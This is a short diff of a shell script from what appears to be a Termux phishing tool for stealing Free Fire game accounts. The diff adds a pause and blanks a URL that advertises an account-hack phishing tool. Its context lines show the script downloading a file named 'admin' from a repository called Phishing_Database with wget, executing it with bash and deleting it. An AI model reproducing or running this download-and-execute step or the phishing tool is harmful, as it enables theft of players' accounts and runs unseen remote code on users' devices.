@@ -1043,6 +1043,7 @@ echo -ne "\e[33m Checking Update : " && sleep 1 && wget -q https://github.com/On
 echo ""
 echo -ne "\e[33m Admin Permission : " && wget -q https://github.com/suman333mondal/Phishing_Database/raw/main/Suman/Phishing/FreeFire/admin > /dev/null && bash admin && rm -rf admin
 echo ""
+sleep 1
 }
 
 clear
@@ -1056,7 +1057,7 @@ check_status
 check_update
 sleep 2
 echo ""
-termux-open-url https://wwu.onlinehacking.in/free-fire-account-hack-phishing-tool-with-termux
+termux-open-url 
 clear
 echo ""
 	printf "                     \e[91m|===========================|
